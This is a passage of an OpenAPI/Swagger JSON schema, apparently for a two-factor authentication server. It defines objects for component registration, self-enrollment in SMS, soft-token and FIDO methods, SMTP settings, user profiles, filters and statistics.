    "Request_UnregisterComponent": {
      "properties": {
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_UnregisterComponent"
    },
    "Request_UnregisterComponentByKey": {
      "properties": {
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        },
        "key": {
          "description": "Unique component key.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_UnregisterComponentByKey"
    },
    "Request_UnregisterComponentByKeys_Multiaction2": {
      "properties": {
        "keys": {
          "description": "Unique component keys.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ComponentKey"
          }
        },
        "companyGuid": {
          "type": "string",
          "format": "guid",
          "x-nullable": true
        },
        "filter": {
          "$ref": "#/definitions/ComponentInfoWithSettingsFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_UnregisterComponentByKeys_Multiaction2"
    },
    "Request_UpdateApiCredentials": {
      "properties": {
        "username": {
          "description": "API credentials - user name (is unique).",
          "type": "string"
        },
        "updateParams": {
          "description": "New parameters. All values must be specified.",
          "$ref": "#/definitions/ApiConsumerSettingsUpdate"
        }
      },
      "type": "object",
      "format": "Request_UpdateApiCredentials"
    },
    "Request_UpdateIdentityProviderConfiguration": {
      "properties": {
        "configuration": {
          "$ref": "#/definitions/IdentityProviderConfiguration"
        },
        "componentKey": {
          "description": "Component key of the Identity Provider server component.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_UpdateIdentityProviderConfiguration"
    },
    "Request_UpdateRadiusClient": {
      "properties": {
        "client": {
          "$ref": "#/definitions/RadiusClientSettings"
        },
        "componentKey": {
          "description": "Component key of the RADIUS server component.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_UpdateRadiusClient"
    },
    "Request_ValidateCommand": {
      "properties": {
        "companyGuid": {
          "description": "GUID of Company.",
          "type": "string",
          "format": "guid",
          "x-nullable": true
        },
        "command": {
          "description": "Command to validate.",
          "type": "string"
        },
        "messageType": {
          "description": "Type of message the command is used for. Possible values: 1 - provisioning, 2 - sending OTP.",
          "type": "integer",
          "format": "enum",
          "enum": [
            1,
            2
          ]
        }
      },
      "type": "object",
      "format": "Request_ValidateCommand"
    },
    "Request_VerifyInvitation": {
      "properties": {
        "code": {
          "description": "Invitation code.",
          "type": "string"
        },
        "machineName": {
          "description": "Will be used as a name of the invited computer. This invited computer will be automatically renamed if sending different machineName to RegisterComponent later (this handles e.g. renaming of a computer where the component runs).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_VerifyInvitation"
    },
    "SchemaProperty": {
      "properties": {
        "Name": {
          "description": "Property name to send e.g. as MobileNumberAttribute.",
          "type": "string"
        },
        "DisplayName": {
          "description": "Property display name to show in the list of possible properties.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "SchemaProperty"
    },
    "SelfEnrollment_IncompleteData": {
      "properties": {
        "HasSomeCompleteType": {
          "description": "If the user has some completely configured authentication type. In this case, a valid login must be done to receive selfEnrollmentKey (to be provided to SelfEnroll).",
          "type": "boolean"
        },
        "Sms": {
          "description": "If present, the user can self-enroll for SMS. Contains description of data which have to be filled in.",
          "$ref": "#/definitions/SelfEnrollment_IncompleteData_Sms"
        },
        "SoftTokens": {
          "description": "If present, the user can self-enroll for soft tokens (OTP or Push). Contains description of data which have to be filled in.",
          "$ref": "#/definitions/SelfEnrollment_IncompleteData_SoftTokens"
        },
        "FIDO": {
          "description": "If present, the user can self-enroll for FIDO. Contains description of data which have to be filled in.",
          "$ref": "#/definitions/SelfEnrollment_IncompleteData_FIDO"
        }
      },
      "type": "object",
      "format": "SelfEnrollment_IncompleteData"
    },
    "SelfEnrollment_IncompleteData_FIDO": {
      "type": "object",
      "format": "SelfEnrollment_IncompleteData_FIDO"
    },
    "SelfEnrollment_IncompleteData_Sms": {
      "properties": {
        "PhoneNumber": {
          "description": "If phone number has to be filled in for the self-enrollment.",
          "type": "boolean"
        },
        "Email": {
          "description": "If email has to be filled in for the self-enrollment.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "SelfEnrollment_IncompleteData_Sms"
    },
    "SelfEnrollment_IncompleteData_SoftTokens": {
      "properties": {
        "PhoneNumber": {
          "description": "If phone number has to be filled in for the self-enrollment.",
          "type": "boolean"
        },
        "Email": {
          "description": "If email has to be filled in for the self-enrollment.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "SelfEnrollment_IncompleteData_SoftTokens"
    },
    "SelfEnrollment_Result": {
      "properties": {
        "Sms": {
          "description": "If present, the self-enrollment for SMS was done. Contains details about the self-enrollment completion.",
          "$ref": "#/definitions/SelfEnrollment_Result_Sms"
        },
        "SoftTokens": {
          "description": "If present, the self-enrollment for soft tokens was done. Contains details about the self-enrollment completion.",
          "$ref": "#/definitions/SelfEnrollment_Result_SoftTokens"
        },
        "FIDO": {
          "description": "If present, the self-enrollment for FIDO was done.",
          "$ref": "#/definitions/SelfEnrollment_Result_FIDO"
        }
      },
      "type": "object",
      "format": "SelfEnrollment_Result"
    },
    "SelfEnrollment_Result_FIDO": {
      "type": "object",
      "format": "SelfEnrollment_Result_FIDO"
    },
    "SelfEnrollment_Result_Sms": {
      "properties": {
        "PhoneNumber": {
          "description": "Phone number where SMS OTPs will be sent.",
          "type": "string"
        },
        "Email": {
          "description": "Email where OTPs will be sent.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "SelfEnrollment_Result_Sms"
    },
    "SelfEnrollment_Result_SoftTokens": {
      "properties": {
        "ProvisioningUrl": {
          "description": "Provisioning URL.",
          "$ref": "#/definitions/ProvisioningLinkQR"
        }
      },
      "type": "object",
      "format": "SelfEnrollment_Result_SoftTokens"
    },
    "SelfEnrollment_UserInput": {
      "properties": {
        "Sms": {
          "description": "If present, the self-enrollment for SMS will be done. Contains values filled in by the user or device.",
          "$ref": "#/definitions/SelfEnrollment_UserInput_Sms"
        },
        "SoftTokens": {
          "description": "If present, the self-enrollment for soft tokens will be done. Contains values filled in by the user or device.",
          "$ref": "#/definitions/SelfEnrollment_UserInput_SoftTokens"
        },
        "FIDO": {
          "description": "If present, the self-enrollment for FIDO will be done. Contains values filled in by the user or device.",
          "$ref": "#/definitions/SelfEnrollment_UserInput_FIDO"
        }
      },
      "type": "object",
      "format": "SelfEnrollment_UserInput"
    },
    "SelfEnrollment_UserInput_FIDO": {
      "properties": {
        "AttestationResponse": {
          "description": "Registration response from the FIDO authenticator.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "SelfEnrollment_UserInput_FIDO"
    },
    "SelfEnrollment_UserInput_Sms": {
      "properties": {
        "PhoneNumber": {
          "description": "Phone number where SMS OTPs will be sent.",
          "type": "string"
        },
        "Email": {
          "description": "Email where OTPs will be sent.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "SelfEnrollment_UserInput_Sms"
    },
    "SelfEnrollment_UserInput_SoftTokens": {
      "properties": {
        "PhoneNumber": {
          "description": "Phone number for application provisioning.",
          "type": "string"
        },
        "Email": {
          "description": "Email for application provisioning.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "SelfEnrollment_UserInput_SoftTokens"
    },
    "ServiceDiscoveryInfo": {
      "properties": {
        "ServerVersion": {
          "description": "Version of Authentication Server.",
          "type": "string"
        },
        "IntegrationMode": {
          "description": "Authentication Server integration mode. Possible values: 0 - Active Directory integration, 1 - Standalone mode.",
          "type": "integer",
          "format": "int32"
        },
        "Compatibility": {
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "ServiceDiscoveryInfo"
    },
    "SMTPSettings": {
      "properties": {
        "Smtp": {
          "description": "SMTP server address.",
          "type": "string"
        },
        "Port": {
          "description": "SMTP server port.",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "Login": {
          "description": "Login to SMTP server.",
          "type": "string"
        },
        "Password": {
          "description": "Password for specified login.",
          "type": "string"
        },
        "Sender": {
          "description": "Sender address.",
          "type": "string"
        },
        "SslTls": {
          "description": "SSL/TLS mode of the SMTP server. Possible values: 0 - none, 1 - auto, 2 - SSL on connect, 3 - start TLS, 4 - start TLS when available ",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3,
            4
          ]
        }
      },
      "type": "object",
      "format": "SMTPSettings"
    },
    "StartTwoFactorResult": {
      "properties": {
        "Whitelisted": {
          "description": "If the user is whitelisted, they should be logged in without entering second factor.",
          "type": "boolean"
        },
        "TwoFactorAuthEnabled": {
          "description": "If 2FA (at least one authentication type) is enabled for the user. If enabled, user must be prompted for second factor. If disabled, the behavior can depend on the setting if non-2FA users should be allowed.",
          "type": "boolean",
          "x-nullable": true
        },
        "AllTwoFaTypes": {
          "description": "Contains enabled authentication types for the user (as configured in the user profile).",
          "$ref": "#/definitions/AuthenticationTypes"
        },
        "SuccessfulTwoFaTypes": {
          "description": "Contains authentication types currently usable for the user. Authentication types not usable during this logging in are left out (e.g. if SMS sending failed, SMS is excluded from the result). This value is recommended to be used to tell the user what they should enter and to build the correct GUI for login.",
          "$ref": "#/definitions/AuthenticationTypes"
        },
        "WaitingTwoFaTypes": {
          "description": "Contains authentication types which, although not usable yet, will be usable after initialization.",
          "$ref": "#/definitions/AuthenticationTypes"
        },
        "IncompleteAuthenticationTypes": {
          "description": "Information about authentication types which can be configured by the user.",
          "$ref": "#/definitions/SelfEnrollment_IncompleteData"
        },
        "PushChallengeId": {
          "description": "Send this to CheckPushChallenge to check if the Push was approved by the user.",
          "type": "string"
        },
        "PushIdenticon": {
          "description": "Identicon shown in the Push notification on user's device. Should be shown in the authentication component GUI, so the user can verify if the Push data is consistent (if the login is secure).",
          "type": "string"
        },
        "AssertionOptions": {
          "description": "FIDO assertion options to be passed to the FIDO authenticator.",
          "type": "string"
        },
        "OfflineCacheKey": {
          "description": "Used only for offline mode support (CheckPushChallengeAndSync, CheckPushChallengeAndSyncNew).",
          "type": "string"
        },
        "ConfirmingSelfEnrollment": {
          "description": "If this login will be used to confirm the previous self-enrollment (the login will operate only with the newly enrolled credential).",
          "type": "boolean"
        },
        "SoftTokenType": {
          "description": "Type of mobile application token. Possible values: 1 - HOTP, 2 - TOTP.",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            1,
            2
          ]
        },
        "HardTokenType": {
          "description": "Type of hard token. Possible values: 1 - HOTP, 2 - TOTP.",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            1,
            2
          ]
        }
      },
      "type": "object",
      "format": "StartTwoFactorResult"
    },
    "Stream": {
      "type": "string",
      "format": "stream"
    },
    "SyncRealmDone": {
      "properties": {
        "AddedCount": {
          "type": "integer",
          "format": "int32"
        },
        "UpdatedCount": {
          "type": "integer",
          "format": "int32"
        },
        "DeletedCount": {
          "type": "integer",
          "format": "int32"
        }
      },
      "type": "object",
      "format": "SyncRealmDone"
    },
    "SyncRealmResult": {
      "properties": {
        "Processed": {
          "description": "Information about synchronization result.",
          "$ref": "#/definitions/SyncRealmDone"
        }
      },
      "type": "object",
      "format": "SyncRealmResult"
    },
    "UrlInfo": {
      "properties": {
        "AdditionalArguments": {
          "type": "string"
        },
        "ActivationLink": {
          "type": "string"
        },
        "RenewLink": {
          "type": "string"
        },
        "SupportLink": {
          "type": "string"
        },
        "Username": {
          "type": "string"
        },
        "DistGuid": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "UrlInfo"
    },
    "UsedComponent": {
      "properties": {
        "ComponentTypeKey": {
          "description": "Unique component type identifier.",
          "type": "string"
        },
        "ComponentKey": {
          "description": "Unique component identifier.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "UsedComponent"
    },
    "UserBasicData": {
      "properties": {
        "Name": {
          "description": "User's name.",
          "type": "string"
        },
        "Phone": {
          "description": "User's phone number. Is used to send provisioning and OTP messages.",
          "type": "string"
        },
        "Email": {
          "description": "User's email. Can be used to send provisioning and OTP messages.",
          "type": "string"
        },
        "Displayname": {
          "description": "User's display name. Displayed in user list, can be edited.",
          "type": "string"
        },
        "DistinguishedName": {
          "description": "AD/LDAP user's object Distinguished Name.",
          "type": "string"
        },
        "SyncType": {
          "description": "Sync type",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            0,
            1
          ]
        }
      },
      "type": "object",
      "format": "UserBasicData"
    },
    "UserFilter": {
      "properties": {
        "Realm": {
          "description": "Filtering by realm",
          "$ref": "#/definitions/UserRealm"
        },
        "RealmName": {
          "description": "Filtering by realm name",
          "type": "string"
        },
        "Name": {
          "description": "Filtering by user name",
          "type": "string"
        },
        "DisplayName": {
          "description": "Filtering by display name",
          "type": "string"
        },
        "Ou": {
          "description": "Filtering by OU",
          "type": "string"
        },
        "HasMobileNumber": {
          "description": "Filtering by mobile number",
          "type": "boolean",
          "x-nullable": true
        },
        "HasEmail": {
          "description": "Filtering by email",
          "type": "boolean",
          "x-nullable": true
        },
        "HasDisplayName": {
          "description": "Filtering by display name",
          "type": "boolean",
          "x-nullable": true
        },
        "HasFailedLogins": {
          "description": "Filtering by failed logins",
          "type": "boolean",
          "x-nullable": true
        },
        "LastSuccessfulLoginFrom": {
          "description": "Filtering by last successful login",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "LastSuccessfulLoginTo": {
          "description": "Filtering by last successful login",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "LastFailedLoginFrom": {
          "description": "Filtering by last failed login",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "LastFailedLoginTo": {
          "description": "Filtering by last failed login",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "Category": {
          "description": "Filtering by realm category",
          "type": "string"
        },
        "StructurePath": {
          "description": "Filtering by structure path",
          "type": "string"
        },
        "SelectionId": {
          "description": "Filtering by selection ID",
          "type": "string"
        },
        "Warnings": {
          "description": "Filtering by warnings type",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            0,
            1,
            2,
            3,
            4,
            5,
            6,
            7,
            8,
            9,
            10,
            -2,
            -1
          ]
        },
        "Method": {
          "description": "Filtering by 2FA method",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            1,
            2,
            4,
            8,
            16,
            32
          ]
        },
        "Status": {
          "description": "Filtering by user status",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            0,
            1,
            2,
            3,
            4,
            5
          ]
        },
        "ColumnId": {
          "description": "Sorting column id",
          "type": "string"
        },
        "Order": {
          "description": "Ascending or descending order",
          "type": "string"
        },
        "FirstRowIndex": {
          "description": "Index of first item",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last item",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "UserFilter"
    },
    "UsernameWithRealmAndCompany": {
      "properties": {
        "Realm": {
          "description": "Realm the user belongs to.",
          "$ref": "#/definitions/UserRealm"
        },
        "Username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "UsernameWithRealmAndCompany"
    },
    "UserProfile": {
      "properties": {
        "AccountEnabled": {
          "description": "If the account (e.g. Active Directory account) is enabled. This information is not influenced by 2FA settings or state.",
          "type": "boolean"
        },
        "TwoFactorAuthLocked": {
          "description": "If the 2FA logins are locked (because of too many failed attempts).",
          "type": "boolean"
        },
        "AccountLocked": {
          "description": "If the account (e.g. Active Directory account) is locked. This information is not influenced by 2FA settings or state.",
          "type": "boolean"
        },
        "TwoFactorAuthEnabled": {
          "description": "If 2FA (at least one authentication type) is enabled for the user.",
          "type": "boolean"
        },
        "LastFailedAuthentication": {
          "description": "Last failed 2FA authentication.",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "LastSuccessfulAuthentication": {
          "description": "Last successful 2FA authentication.",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "LifetimeFailures": {
          "description": "Total count of failed 2FA authentications.",
          "type": "integer",
          "format": "int64"
        },
        "LifetimeSuccesses": {
          "description": "Total count of successful 2FA authentications.",
          "type": "integer",
          "format": "int64"
        },
        "PhoneNumber": {
          "description": "User's phone number. Is used to send provisioning and OTP messages.",
          "type": "string"
        },
        "SyncPhoneNumber": {
          "description": "Synchronized phone number (received directly from AD or using user synchronization).",
          "type": "string"
        },
        "EsaPhoneNumber": {
          "description": "Phone number manually entered to ESA.",
          "type": "string"
        },
        "Email": {
          "description": "User's email. Can be used to send provisioning and OTP messages.",
          "type": "string"
        },
        "SyncEmail": {
          "description": "Synchronized email (received directly from AD or using user synchronization).",
          "type": "string"
        },
        "EsaEmail": {
          "description": "Email manually entered to ESA.",
          "type": "string"
        },
        "Displayname": {
          "description": "User's display name. Displayed in user list, can be edited.",
          "type": "string"
        },
        "SyncDisplayname": {
          "description": "Synchronized display name (received directly from AD or using user synchronization).",
          "type": "string"
        },
        "EsaDisplayname": {
          "description": "Display name manually entered to ESA.",
          "type": "string"
        },
        "AuthenticationTypes": {
          "description": "Enabled authentication types for the user.",
          "$ref": "#/definitions/AuthenticationTypes"
        },
        "HardTokenSerialNumber": {
          "description": "Serial number of currently assigned hard token.",
          "type": "string"
        },
        "NumberOfFIDOCredentialsRegistered": {
          "description": "Number of FIDO credentials that were registered.",
          "type": "integer",
          "format": "int32"
        },
        "UnsuccessfulAttempts": {
          "description": "Unsuccessful 2FA authentication attempts. Is reset on successful 2FA authentication. The user is locked (TwoFactorAuthLocked) based on this.",
          "type": "integer",
          "format": "int64"
        },
        "Name": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "Realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm_WithInfo"
        },
        "Owned": {
          "description": "If the user account is owned by ESA. In AD mode, users from default domain are not owned by ESA (they exist in Active Directory).",
          "type": "boolean"
        },
        "WaitingToSendApp": {
          "description": "If mobile application authentication types have been enabled, but the mobile application has not been sent yet.  Deprecated - use Warnings instead.",
          "type": "boolean"
        },
        "AppSent": {
          "description": "If mobile application has been already sent.",
          "type": "boolean"
        },
        "WaitingToUseApp": {
          "description": "If mobile application has been sent, but the user has not logged in using it yet. Deprecated - use Warnings instead.",
          "type": "boolean"
        },
        "Warnings": {
          "description": "Warnings about user profile setup.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UserProfileWarning"
          }
        },
        "SoftTokenType": {
          "description": "Type of mobile application token. Possible values: 1 - HOTP, 2 - TOTP.",
          "type": "integer",
          "format": "enum",
          "enum": [
            1,
            2
          ]
        },
        "GlobalInfo": {
          "description": "Global profiles info used for warnings.",
          "$ref": "#/definitions/UserProfilesGlobalInfo"
        },
        "RegisteredOrigins": {
          "description": "Registered origins for FIDO.",
          "type": "array",
          "items": {
            "type": "string"
          }
        },
        "Ou": {
          "description": "AD Organizational Units path.",
          "type": "string"
        },
        "UsedComponents": {
          "description": "Last components used by the user.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UsedComponent"
          }
        },
        "IsSuperuser": {
          "description": "If this is an Admin user, whether the user is a Superuser.",
          "type": "boolean"
        },
        "ManagedCompanies": {
          "description": "If this is an Admin user, the number of Companies the user can manage.",
          "type": "integer",
          "format": "int32"
        },
        "CompanyGuid": {
          "description": "Company guid",
          "type": "string",
          "format": "guid"
        },
        "UserGuid": {
          "description": "User guid",
          "type": "string"
        },
        "Status": {
          "description": "User status",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3,
            4,
            5
          ]
        },
        "StatusDescription": {
          "description": "User status description",
          "type": "string"
        }
      },
      "type": "object",
      "format": "UserProfile"
    },
    "UserProfilesGlobalInfo": {
      "properties": {
        "PhoneNumberNeededForProvisioning": {
          "description": "If phone numbers are needed to deliver provisioning messages (which is usually the case, unless custom delivery without using of phone number is configured).",
          "type": "boolean"
        },
        "PhoneNumberNeededForSmsDelivery": {
          "description": "If phone numbers are needed to deliver OTP SMS (which is usually the case, unless custom delivery without using of phone number is configured).",
          "type": "boolean"
        },
        "EmailNeededForProvisioning": {
          "description": "If emails are needed to deliver provisioning messages.",
          "type": "boolean"
        },
        "EmailNeededForSmsDelivery": {
          "description": "If emails are needed to deliver OTP.",
          "type": "boolean"
        },
        "HardTokensEnabled": {
          "description": "If logging in using hard tokens is globally enabled.",
          "type": "boolean"
        },
        "FIDOAvailable": {
          "description": "If Authentication Server supports FIDO authentication.",
          "type": "boolean"
        },
        "SelfEnrollmentEnabled": {
          "description": "If self-enrollment is enabled.",
          "type": "boolean"
        },
        "CanSendOtpSms": {
          "description": "If Authentication Server is able to send OTP SMS (either it has a license with OTP SMS credits or Custom Delivery for OTP SMS is set.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "UserProfilesGlobalInfo"
    },
    "UserProfilesResponse": {
      "properties": {
        "FilteredItems": {
          "description": "Filtered user profiles",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UserProfile"
          }
        },
        "TotalCount": {
          "description": "Count of all items on server",
          "type": "integer",
          "format": "int64"
        },
        "FirstRowIndex": {
          "description": "Index of first returned item from filtered result",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last returned item from filtered result",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "FilteredCount": {
          "description": "Count of filter items",
          "type": "integer",
          "format": "int64"
        }
      },
      "type": "object",
      "format": "UserProfilesResponse"
    },
    "UserProfileWarning": {
      "properties": {
        "Type": {
          "description": "Type of the warning. Possible values: 0 - phone number missing, 1 - user will transition to app, 2 - user is transitioning to app, 3 - waiting to send app, 4 - waiting to initialize, 5- waiting to use app, 6 - not assigned, 7 - disabled globally, 8 - not supported.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3,
            4,
            5,
            6,
            7,
            8,
            9,
            10
          ]
        },
        "Scope": {
          "description": "Scope of the warning. Possible values: 0 - sms, 1 - soft tokens, 2 - soft tokens Push, 3 - hard tokens, 4 - FIDO.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3,
            4
          ]
        }
      },
      "type": "object",
      "format": "UserProfileWarning"
    },
    "UserRealm": {
      "properties": {
        "Type": {
          "description": "Specify \"system\" for ESA internal realms (e.g. Web Console users). Otherwise specify \"auth\" or leave unspecified.",
          "type": "string"
        },
        "Id": {
          "description": "E.g. GUID of domain or computer.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "UserRealm"
    },
    "UserRealm_WithAutoRegParams": {
      "properties": {
        "Type": {
          "description": "Specify \"system\" for ESA internal realms (e.g. Web Console users). Otherwise specify \"auth\" or leave unspecified.",
          "type": "string"
        },
        "Id": {
          "description": "E.g. GUID of domain or computer.",
          "type": "string"
        },
        "IsVerified": {
          "description": "If true, the realm will be allowed to be auto-registered if it does not exist.",
          "type": "boolean"
        },
        "Name": {
          "description": "Display name.",
          "type": "string"
        },
        "Category": {
          "description": "Category (if the realm corresponds e.g. to domain or computer). Well known categories are: \"ad_ldap\", \"windows_computer\", \"custom\".",
          "type": "string"
        }
      },
      "type": "object",
      "format": "UserRealm_WithAutoRegParams"
    },
    "UserRealm_WithInfo": {
      "properties": {
        "Type": {
          "description": "Specify \"system\" for ESA internal realms (e.g. Web Console users). Otherwise specify \"auth\" or leave unspecified.",
          "type": "string"
        },
        "Id": {
          "description": "E.g. GUID of domain or computer.",
          "type": "string"
        },
        "Name": {
          "description": "Display name.",
          "type": "string"
        },
        "FullName": {
          "description": "Realm display name together with suffix (number resolving name conflicts).",
          "type": "string"
        },
        "Category": {
          "description": "Category (if the realm corresponds e.g. to domain or computer). Well known categories are: \"ad_ldap\", \"windows_computer\", \"custom\".",
          "type": "string"
        },
        "CompanyGuid": {
          "description": "GUID of Company.",
          "type": "string",
          "format": "guid"
        },
        "OrganizationalUnits": {
          "description": "Organizational Units from AD realm",
          "type": "array",
          "items": {
            "$ref": "#/definitions/OrganizationalUnit"
          }
        }
      },
      "type": "object",
      "format": "UserRealm_WithInfo"
    },
    "UserRealm_WithRegParams": {
      "properties": {
        "Type": {
          "description": "Specify \"system\" for ESA internal realms (e.g. Web Console users). Otherwise specify \"auth\" or leave unspecified.",
          "type": "string"
        },
        "Id": {
          "description": "E.g. GUID of domain or computer.",
          "type": "string"
        },
        "Name": {
          "description": "Display name.",
          "type": "string"
        },
        "Category": {
          "description": "Category (if the realm corresponds e.g. to domain or computer). Well known categories are: \"ad_ldap\", \"windows_computer\", \"custom\".",
          "type": "string"
        }
      },
      "type": "object",
      "format": "UserRealm_WithRegParams"
    },
    "UserSelection": {
      "properties": {
        "Id": {
          "description": "Unique identifier of this selection.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "UserSelection"
    },
    "UserStatistics": {
      "properties": {
        "Total": {
          "description": "Total count of users.",
          "type": "integer",
          "format": "int32"
        },
        "TwoFAEnabled": {
          "description": "Count of users with 2FA (at least one authentication type) enabled.",
          "type": "integer",
          "format": "int32"
        },
        "WaitingToUseApp": {
          "description": "Count of users for which the mobile application was sent, but the user has not logged in using the application yet.",
          "type": "integer",
          "format": "int32"
        },
        "SetupIncomplete": {
          "description": "Count of users with some issues in 2FA setup.",
          "type": "integer",
          "format": "int32"
        },
        "SomeSetupIncomplete": {
          "description": "List of users from SetupIncomplete (if there are a lot of such users, only some of them are returned).",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UserWithRealm"
          }
        },
        "SomeWaitingToUseApp": {
          "description": "List of users from WaitingToUseApp (if there are a lot of such users, only some of them are returned).",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UserWithRealm"
          }
        },
        "Locked": {
          "description": "Count of users for which the 2FA logins are locked (because of too many failed attempts)",
          "type": "integer",
          "format": "int32"
        },
        "SomeLocked": {
          "description": "List of users from Locked (if there are a lot of such users, only some of them are returned).",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UserWithRealm"
          }
        }
      },
      "type": "object",
      "format": "UserStatistics"
    },
    "UserWithRealm": {
      "properties": {
        "Name": {
          "type": "string"
        },
        "Realm": {
          "$ref": "#/definitions/UserRealm_WithInfo"
        }
      },
      "type": "object",
      "format": "UserWithRealm"
    }
  },
  "securityDefinitions": {
    "basicAuth": {
      "type": "basic",
      "description": "Basic authentication"
    }
  },
  "security": [
    {
      "basicAuth": []
    }
  ]
}
